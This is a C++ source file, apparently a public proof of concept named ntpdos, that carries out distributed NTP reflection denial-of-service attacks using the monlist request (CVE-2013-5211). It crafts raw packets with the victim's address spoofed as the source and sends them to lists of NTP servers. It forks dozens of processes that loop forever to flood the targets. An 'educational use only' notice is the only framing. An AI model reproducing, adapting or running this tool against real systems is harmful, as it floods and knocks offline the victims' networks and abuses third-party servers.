/*******************************************************************************
 * ntpdos.cpp - NTP distributed reflection DoS                                 *
 *                                                                             *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * ntpdos - PoC for distributed NTP reflection DoS (CVE-2013-5211).            *
 *                                                                             *
 *                                                                             *
 * AUTHOR                                                                      *
 * sepehrdad                                                                   *
 *                                                                             *
 *                                                                             *
 * LICENSE                                                                     *
 * This software is distributed under the GNU General Public License version 3 *
 *                                                                             *
 *                                                                             *
 * LEGAL NOTICE                                                                *
 * THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY    *
 * ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.        *
 * BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.                          *
 *                                                                             *
 ******************************************************************************/

#include <arpa/inet.h>
#include <fstream>
#include <getopt.h>
#include <iostream>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

#define VERSION "v0.1"
#define ERR(str) std::cerr << "[-] ERROR: " << str << '\n'

#define NTP_PORT 123
#define DELAY 2000

struct ntp_req_t {
  unsigned char rm_vn_mode;     /* response, more, version, mode */
  unsigned char auth_seq;       /* key, sequence number */
  unsigned char implementation; /* implementation number */
  unsigned char request;        /* request number */
  unsigned short err_nitems;    /* error code/number of data items */
  unsigned short mbz_itemsize;  /* item size */
  char data[40];                /* data area [32 prev](176 byte max) */
  unsigned long tstamp;         /* time stamp, for authentication */
  unsigned int keyid;           /* encryption key */
  char mac[8];                  /* (optional) 8 byte auth code */
};

class Packet {
  char pkt[sizeof(iphdr) + sizeof(udphdr) + sizeof(ntp_req_t)]{};
  iphdr *ip{reinterpret_cast<iphdr *>(pkt)};
  udphdr *udp{reinterpret_cast<udphdr *>(pkt + sizeof(iphdr))};
  ntp_req_t *ntp{
      reinterpret_cast<ntp_req_t *>(pkt + sizeof(iphdr) + sizeof(udphdr))};

  unsigned short csum(unsigned short *addr, int len) {
    unsigned long sum;
    for (sum = 0; len > 0; len--)
      sum += *addr++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return static_cast<unsigned short>(~sum);
  }

public:
  Packet() = default;

  Packet(std::string src, std::string dst) {
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(pkt);
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(src.c_str());
    ip->daddr = inet_addr(dst.c_str());

    udp->source = htons(rand());
    udp->dest = htons(NTP_PORT);
    udp->len = htons(sizeof(udphdr) + sizeof(ntp_req_t));
    udp->check = 0;

    ip->check = csum(reinterpret_cast<unsigned short *>(pkt), sizeof(pkt));

    ntp->rm_vn_mode = 0x27;
    ntp->implementation = 0x03;
    ntp->request = 0x2a;
  }

  Packet(Packet const &o) = default;
  Packet &operator=(Packet const &o) = default;

  Packet(Packet &&o) = default;
  Packet &operator=(Packet &&o) = default;

  char *get() { return pkt; }
  std::size_t size() { return sizeof(pkt); }

  ~Packet() = default;
};

class Socket {
  int fd = 0, on = 1;
  sockaddr_in dest{};

public:
  Socket() = default;

  Socket(std::string dst) {
    dest.sin_family = AF_INET;
    dest.sin_port = htons(NTP_PORT);
    dest.sin_addr.s_addr = inet_addr(dst.c_str());
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
      perror("[-] Error ");
      exit(1);
    }
    if ((connect(fd, reinterpret_cast<sockaddr *>(&dest), sizeof(dest))) < 0) {
      perror("[-] Error ");
      close(fd);
      exit(1);
    }
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
      perror("[-] Error ");
      exit(1);
    }
  }

  void send(Packet &pkt) {
    if (sendto(fd, pkt.get(), pkt.size(), 0,
               reinterpret_cast<sockaddr *>(&dest), sizeof(dest) < 0)) {
      perror("[-] Error ");
      close(fd);
    }
  }

  Socket(Socket const &o) = default;
  Socket &operator=(Socket const &o) = default;

  Socket(Socket &&o) = default;
  Socket &operator=(Socket &&o) = default;

  ~Socket() { close(fd); };
};

void version() { std::cout << "ntpdos " << VERSION << '\n'; }

void banner() { std::cout << "--==[ ntpdos by sepehrdad ]==--\n\n"; }

void help() {
  std::cout << "usage:\n\n\
  ntpdos -t <addr> -s <addr> [options] | [misc]\n\n"
            << "options:\n\n"
            << "  -t <addr>    - target ip address\n"
            << "  -T <file>    - list of target ip addresses\n"
            << "  -s <addr>    - ntp server ip address\n"
            << "  -S <file>    - list of ntp server ip addresses\n"
            << "  -p <num>     - number of parallel processes (default: 80)\n\n"
            << "misc:\n\n"
            << "  -V           - show version\n"
            << "  -H           - show help\n\n";
}

void load_file(std::string filename, std::vector<std::string> &vec) {
  std::ifstream filestream(filename);

  if (filestream.good() && filestream.is_open()) {
    std::string line{};
    while (getline(filestream, line))
      vec.push_back(line);
    filestream.close();
  } else {
    ERR("Unable to open " + filename);
    exit(EXIT_FAILURE);
  }
}

void attack(const std::vector<std::string> targets,
            const std::vector<std::string> servers) {

  std::vector<Socket> sockets(servers.size());

  for (auto &server : servers)
    sockets.emplace_back(server);

  while (true) {
    for (auto &target : targets) {
      for (std::size_t i = 0; i < servers.size(); ++i) {
        Packet pkt{target, servers[i]};
        sockets[i].send(pkt);
      }
    }
    usleep(DELAY);
  }
}

int main(int argc, char *argv[]) {
  banner();

  if (argc < 2) {
    ERR("use -H for help");
    exit(EXIT_FAILURE);
  }

  int c{0}, processes{80};
  std::vector<std::string> targets{}, servers{};

  while ((c = getopt(argc, argv, "VHp:s:S:t:T:")) != -1) {
    switch (c) {
    case 'p':
      processes = std::strtol(optarg, NULL, 10);
      if (processes <= 0) {
        ERR("processes number can't be negative");
        exit(EXIT_FAILURE);
      }
      break;
    case 't':
      targets.push_back(optarg);
      break;
    case 'T':
      load_file(optarg, targets);
      break;
    case 's':
      servers.push_back(optarg);
      break;
    case 'S':
      load_file(optarg, servers);
      break;
    case 'V':
      version();
      exit(EXIT_SUCCESS);
    case 'H':
      help();
      exit(EXIT_SUCCESS);
    default:
      exit(EXIT_FAILURE);
    }
  }

  if (!(targets.size() > 0)) {
    ERR("No target have been selected");
    exit(EXIT_FAILURE);
  }

  if (!(servers.size() > 0)) {
    ERR("No server have been selected");
    exit(EXIT_FAILURE);
  }

  for (int p = 0; p < processes; ++p) {
    if (fork())
      attack(targets, servers);
  }

  getc(stdin);

  return 0;
}
